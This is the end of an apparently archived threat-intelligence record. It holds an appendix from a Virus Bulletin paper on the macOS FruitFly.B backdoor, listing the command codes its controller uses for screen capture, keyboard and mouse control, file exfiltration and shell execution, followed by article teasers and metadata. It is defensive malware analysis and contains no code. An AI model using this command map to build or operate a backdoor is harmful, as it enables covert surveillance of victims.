'a' specifies 'a string with\narbitrary binary data, will be null padded' [12].\n\n## Appendix B\n\n### OSX/FruitFly.B commands\n\n**Command** **Subcommand** **Description**\n\n0 Do nothing\n\n2 Screen capture (PNG, JPEG, etc.)\n\n3 Screen bounds\n\n4 Host uptime\n\n6 Evaluate Perl statement\n\n7 Mouse location\n\n8 Mouse action\n\n0 Move mouse\n\n1 Left click (up & down)\n\n2 Left click (up & down)\n\n3 Left double click\n\n4 Left click (down)\n\n5 Left click (up)\n\n6 Right click (down)\n\n7 Right click (up)\n\n11 Working directory\n\n12 File action\n\n0 Does file exist?\n\n1 Delete file\n\n2 Rename (move) file\n\n|Command|Subcommand|Description|\n|---|---|---|\n|0||Do nothing|\n|2||Screen capture (PNG, JPEG, etc.)|\n|3||Screen bounds|\n|4||Host uptime|\n|6||Evaluate Perl statement|\n|7||Mouse location|\n|8||Mouse action|\n||0|Move mouse|\n||1|Left click (up & down)|\n||2|Left click (up & down)|\n||3|Left double click|\n||4|Left click (down)|\n||5|Left click (up)|\n||6|Right click (down)|\n||7|Right click (up)|\n|11||Working directory|\n|12||File action|\n||0|Does file exist?|\n||1|Delete file|\n\n\n-----\n\n|Col1|3|Copy file|\n|---|---|---|\n||4|Size of file|\n||5|Not implemented|\n||6|Read & exfiltrate file|\n||7|Write file|\n||8|File attributes (ls -a)|\n||9|File attributes (ls -al)|\n|13||Malware's script location|\n|14||Execute command in background|\n|16||Key down|\n|17||Key up|\n|19||Kill malware's process|\n|21||Process list|\n|22||Kill process|\n|26||Read string (command not fully implemented?)|\n|27||Directory actions|\n||0|Do nothing|\n||2|Directory listing|\n|29||Read byte (command not fully implemented?)|\n|30||Reset connection to trigger reconnect|\n|35||Get host by name|\n|43||String action|\n||'alert'|Set alert to trigger when user is active|\n||'scrn'|Toggle method of screen capture|\n||'vers'|Malware version|\n||<any other string>|Execute shell command|\n\n\n-----\n\n47 Connect to host\n\n## Latest articles:\n\n### Cryptojacking on the fly: TeamTNT using NVIDIA drivers to mine cryptocurrency\n\nTeamTNT is known for attacking insecure and vulnerable Kubernetes deployments in order\nto infiltrate organizations’ dedicated environments and transform them into attack\nlaunchpads. In this article Aditya Sood presents a new module introduced by…\n\n### Collector-stealer: a Russian origin credential and information extractor\n\nCollector-stealer, a piece of malware of Russian origin, is heavily used on the Internet to\nexfiltrate sensitive data from end-user systems and store it in its C&C panels. In this article,\nresearchers Aditya K Sood and Rohit Chaturvedi present a 360…\n\n### Fighting Fire with Fire\n\nIn 1989, Joe Wells encountered his first virus: Jerusalem. He disassembled the virus, and\nfrom that moment onward, was intrigued by the properties of these small pieces of selfreplicating code. Joe Wells was an expert on computer viruses, was partly…\n\n### Run your malicious VBA macros anywhere!\n\nKurt Natvig wanted to understand whether it’s possible to recompile VBA macros to another\nlanguage, which could then easily be ‘run’ on any gateway, thus revealing a sample’s true\nnature in a safe manner. In this article he explains how he recompiled…\n\n### Dissecting the design and vulnerabilities in AZORult C&C panels\n\nAditya K Sood looks at the command-and-control (C&C) design of the AZORult malware,\ndiscussing his team's findings related to the C&C design and some security issues they\nidentified during the research.\n\n[Bulletin Archive](https://www.virusbulletin.com/virusbulletin/archive)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-11-01 - VB2017 - Offensive Malware Analysis - Dissecting OSX-FruitFly.B Via a Custom C&C Server.pdf"
    ],
    "report_names": [
        "2017-11-01 - VB2017 - Offensive Malware Analysis - Dissecting OSX-FruitFly.B Via a Custom C&C Server.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "f809bfcb-b200-4988-80a8-be78ef6a52ef",
            "created_at": "2023-01-06T13:46:39.186988Z",
            "updated_at": "2025-03-27T02:00:03.016358Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "Adept Libra"
            ],
            "source_name": "MISPGALAXY:TeamTNT",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c3ca592f-0669-49bd-ab5c-310007ab2fb4",
            "created_at": "2022-10-25T15:50:23.334495Z",
            "updated_at": "2025-03-27T02:00:55.445098Z",
            "deleted_at": null,
            "main_name": "TeamTNT",
            "aliases": [
                "TeamTNT"
            ],
            "source_name": "MITRE:TeamTNT",
            "tools": [
                "Peirates",
                "MimiPenguin",
                "LaZagne",
                "Hildegard"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673535828,
    "ts_updated_at": 1743041531,
    "ts_creation_date": 1653787351,
    "ts_modification_date": 1653787351,
    "files": {
        "pdf": "https://archive.orkl.eu/7ee09449e4f167f50d2a3f2781a466ff0d1b4491.pdf",
        "text": "https://archive.orkl.eu/7ee09449e4f167f50d2a3f2781a466ff0d1b4491.txt",
        "img": "https://archive.orkl.eu/7ee09449e4f167f50d2a3f2781a466ff0d1b4491.jpg"
    }
}